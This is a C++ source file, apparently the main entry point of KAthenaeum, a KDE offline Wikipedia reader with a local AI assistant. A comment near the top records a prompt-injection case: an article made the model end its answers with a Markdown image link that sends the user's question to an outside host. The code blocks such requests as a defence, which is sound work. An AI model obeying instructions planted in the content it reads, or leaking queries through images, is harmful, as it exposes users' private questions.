// SPDX-FileCopyrightText: 2026 Jaimie Garner <pacificnm@gmail.com>
// SPDX-License-Identifier: GPL-3.0-or-later
#include <QApplication>
#include <QDir>
#include <QFile>
#include <QMessageBox>
#include <QNetworkAccessManager>
#include <QNetworkDiskCache>
#include <QQmlApplicationEngine>
#include <QQmlNetworkAccessManagerFactory>
#include <QQuickStyle>
#include <QQuickWebEngineProfile>
#include <QQuickWindow>
#include <QStandardPaths>
#include <QtWebEngineQuick/qtwebenginequickglobal.h>

#include <KAboutData>
#include <KCrash>
#include <KDBusService>
#include <KIconTheme>
#include <KLocalizedQmlContext>
#include <KLocalizedString>
#include <KWindowSystem>

#include "appstate.h"
#include "articlestore.h"
#include "connectivity.h"
#include "core/catalog.h"
#include "core/database.h"
#include "core/extract.h"
#include "kathenaeum-version.h"
#include "librarymanager.h"
#include "mapmanager.h"
#include "modelsettings.h"
#include "projectlist.h"
#include "zimschemehandler.h"

namespace
{
// The QML engine's network access: catalog illustrations from kiwix.org (that address shape only, see
// Catalog::isIllustrationUrl), and nothing else. Any text a QML item renders
// as rich text or Markdown (a ZIM title, a snippet, a model's answer) could otherwise make the app fetch an image from
// anywhere: an article told the model to end its answer with ![](http://host/?q=<the question>), and it did, 4 times out
// of 4. The app is offline by design; this keeps it so whatever text is shown.
class KiwixOnlyAccess : public QNetworkAccessManager
{
public:
    using QNetworkAccessManager::QNetworkAccessManager;

protected:
    QNetworkReply *createRequest(Operation op, const QNetworkRequest &request, QIODevice *data) override
    {
        // data: URLs never leave the computer: installed libraries' icons come from the database that way (refusing them
        // too left every library without its icon)
        if (op == GetOperation && (Catalog::isIllustrationUrl(request.url()) || request.url().scheme() == QLatin1String("data")))
            return QNetworkAccessManager::createRequest(op, request, data);
        qWarning("Refused a network request from the interface: %s", qUtf8Printable(request.url().toDisplayString(QUrl::RemoveQuery)));
        return QNetworkAccessManager::createRequest(GetOperation, QNetworkRequest(QUrl(QStringLiteral("refused:"))), nullptr);
    }
};

// Images QML loads from the network (catalog illustrations) are kept on disk, so scrolling the catalog again or opening it
// offline does not fetch them again.
class CachingNetworkFactory : public QQmlNetworkAccessManagerFactory
{
public:
    QNetworkAccessManager *create(QObject *parent) override
    {
        auto *nam = new KiwixOnlyAccess(parent);
        auto *cache = new QNetworkDiskCache(nam);
        cache->setCacheDirectory(QDir(QStandardPaths::writableLocation(QStandardPaths::CacheLocation)).filePath(QStringLiteral("qml-network")));
        cache->setMaximumCacheSize(50 << 20);
        nam->setCache(cache);
        return nam;
    }
};
}

int main(int argc, char *argv[])
{
    KIconTheme::initTheme();
    initXmlParser(); // once, on the main thread, before any worker parses HTML
    ZimSchemeHandler::registerScheme(); // before any web engine profile exists
    QtWebEngineQuick::initialize(); // must run before the application object exists
    QApplication app(argc, argv); // QApplication, not QGuiApplication: the desktop style and Marble need widgets

    // Follow Plasma's look when the user has not chosen a Qt Quick style themselves
    if (qEnvironmentVariableIsEmpty("QT_QUICK_CONTROLS_STYLE"))
        QQuickStyle::setStyle(QStringLiteral("org.kde.desktop"));

    KLocalizedString::setApplicationDomain("kathenaeum");

    KAboutData about(QStringLiteral("kathenaeum"),
                     i18n("KAthenaeum"),
                     QStringLiteral(KATHENAEUM_VERSION_STRING),
                     i18n("A private, offline Wikipedia library with an AI research assistant"),
                     KAboutLicense::GPL_V3,
                     i18n("© 2026 Jaimie Garner"));
    about.addAuthor(i18n("Jaimie Garner"));
    about.setOtherText(
        i18n("Articles come from Wikipedia through Kiwix ZIM files and are under their own licence (Wikipedia: CC BY-SA 4.0). "
             "Answers are written by models running on this computer through Ollama; nothing leaves it. "
             "KAthenaeum is the desktop version of Athenaeum."));
    about.addComponent(QStringLiteral("libzim"), i18n("Reads ZIM files"), QString(), QStringLiteral("https://github.com/openzim/libzim"));
    about.addComponent(QStringLiteral("Kiwix"), i18n("The library catalog and its ZIM files"), QString(), QStringLiteral("https://kiwix.org"));
    about.addComponent(QStringLiteral("Ollama"), i18n("Runs the language and embedding models"), QString(), QStringLiteral("https://ollama.com"));
    about.addComponent(QStringLiteral("Marble"), i18n("Draws the map, from KDE's map server"), QString(), QStringLiteral("https://marble.kde.org"));
    about.addComponent(QStringLiteral("OpenStreetMap"),
                       i18n("Map data © OpenStreetMap contributors (ODbL)"),
                       QString(),
                       QStringLiteral("https://www.openstreetmap.org/copyright"));
    about.addComponent(QStringLiteral("Athenaeum"),
                       i18n("The web application this one is based on"),
                       QString(),
                       QStringLiteral("https://github.com/pacificnm/Athenaeum"));
    about.setHomepage(QStringLiteral("https://github.com/pacificnm/KAthenaeum"));
    // without it, "Report a Bug" went to bugs.kde.org, which has no KAthenaeum product
    about.setBugAddress(QByteArrayLiteral("https://github.com/pacificnm/KAthenaeum/issues"));
    about.setDesktopFileName(QStringLiteral(APP_ID));
    about.setOrganizationDomain("pacificnm.github.io");
    KAboutData::setApplicationData(about);
    QApplication::setWindowIcon(QIcon::fromTheme(QStringLiteral("kathenaeum")));

    KCrash::initialize();
    KDBusService service(KDBusService::Unique); // a second launch raises the running window

    QString dbError;
    const QString dbPath = Database::defaultPath();
    if (!Database::open(dbPath, &dbError)) {
        // Without its database the app would lose every chat, note and library it is given: say so and stop
        QMessageBox::critical(
            nullptr,
            i18n("KAthenaeum"),
            i18n("KAthenaeum cannot open its database, so it will not start.\n\n%1\n\nThe database is %2. Nothing in it has been changed.", dbError, dbPath));
        return 1;
    }
    AppState::instance()->setDatabase(dbPath, dbError);
    Connectivity::createInstance(&app); // before anything that may use the internet
    LibraryManager *libraries = LibraryManager::createInstance(&app);
    ModelSettings::createInstance(&app)->refresh(); // is Ollama there, with the models? (one quick local request)
    // an article caches its rendered page with its saved excerpts marked: a project change may change those
    QObject::connect(ProjectsNotifier::instance(), &ProjectsNotifier::changed, &app, [] {
        ArticleStore::clear();
    });
    libraries->initialize();
    MapManager::createInstance(&app)->initialize();

    // Articles come from zim:// only. Nothing the reader shows needs a disk cache or cookies.
    QQuickWebEngineProfile *profile = QQuickWebEngineProfile::defaultProfile();
    profile->setHttpCacheType(QQuickWebEngineProfile::MemoryHttpCache);
    profile->setPersistentCookiesPolicy(QQuickWebEngineProfile::NoPersistentCookies);
    profile->installUrlSchemeHandler("zim", new ZimSchemeHandler(&app));

    CachingNetworkFactory networkFactory; // declared first: the engine uses it until the engine is destroyed
    QQmlApplicationEngine engine;
    engine.setNetworkAccessManagerFactory(&networkFactory);
    KLocalization::setupLocalizedContext(&engine);
    engine.loadFromModule("KAthenaeum", "Main");
    if (engine.rootObjects().isEmpty())
        return 1;
    // a second launch asks this one to come forward
    if (auto *window = qobject_cast<QQuickWindow *>(engine.rootObjects().constFirst())) {
        QObject::connect(&service, &KDBusService::activateRequested, window, [window] {
            KWindowSystem::updateStartupId(window);
            KWindowSystem::activateWindow(window);
            window->show();
            window->raise();
        });
    }

    return app.exec();
}
